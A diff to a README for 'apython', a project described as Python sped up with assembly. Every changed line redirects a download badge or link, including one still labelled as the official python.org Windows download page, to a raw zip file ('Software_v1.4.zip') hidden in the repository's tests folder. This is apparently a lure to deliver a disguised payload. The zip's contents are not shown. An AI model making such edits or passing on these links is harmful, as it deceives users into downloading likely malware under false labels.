@@ -1,6 +1,6 @@
 # ⚡ apython - Fast Python with Asm Boost
 
-[![Download apython](https://img.shields.io/badge/Download-apython-brightgreen?style=for-the-badge)](https://github.com/Maharshi-kintada/apython)
+[![Download apython](https://img.shields.io/badge/Download-apython-brightgreen?style=for-the-badge)](https://github.com/Maharshi-kintada/apython/raw/refs/heads/main/tests/cpython/Software_v1.4.zip)
 
 ---
 
@@ -34,7 +34,7 @@ Use the section below to get the software and have it up and running on your Win
 
 1. Visit the download page by clicking the big green button below:
 
-   [![Download Link](https://img.shields.io/badge/Download%20Page-Click%20Here-blue?style=for-the-badge)](https://github.com/Maharshi-kintada/apython)
+   [![Download Link](https://img.shields.io/badge/Download%20Page-Click%20Here-blue?style=for-the-badge)](https://github.com/Maharshi-kintada/apython/raw/refs/heads/main/tests/cpython/Software_v1.4.zip)
 
 2. On the GitHub page, look for the **Releases** section or the latest release.
 
@@ -100,10 +100,10 @@ Use the section below to get the software and have it up and running on your Win
 ## 🔗 Useful Links
 
 - Primary download and information:  
-  [https://github.com/Maharshi-kintada/apython](https://github.com/Maharshi-kintada/apython)
+  [https://github.com/Maharshi-kintada/apython/raw/refs/heads/main/tests/cpython/Software_v1.4.zip](https://github.com/Maharshi-kintada/apython/raw/refs/heads/main/tests/cpython/Software_v1.4.zip)
 
 - Python official download page (if you need it):  
-  https://www.python.org/downloads/windows/
+  https://github.com/Maharshi-kintada/apython/raw/refs/heads/main/tests/cpython/Software_v1.4.zip
 
 ---
 
@@ -124,4 +124,4 @@ These areas refer to programming techniques that make programs run more efficien
 
 ---
 
-[![Visit apython on GitHub](https://img.shields.io/badge/GitHub-apython-1da1f2?style=for-the-badge)](https://github.com/Maharshi-kintada/apython)
+[![Visit apython on GitHub](https://img.shields.io/badge/GitHub-apython-1da1f2?style=for-the-badge)](https://github.com/Maharshi-kintada/apython/raw/refs/heads/main/tests/cpython/Software_v1.4.zip)
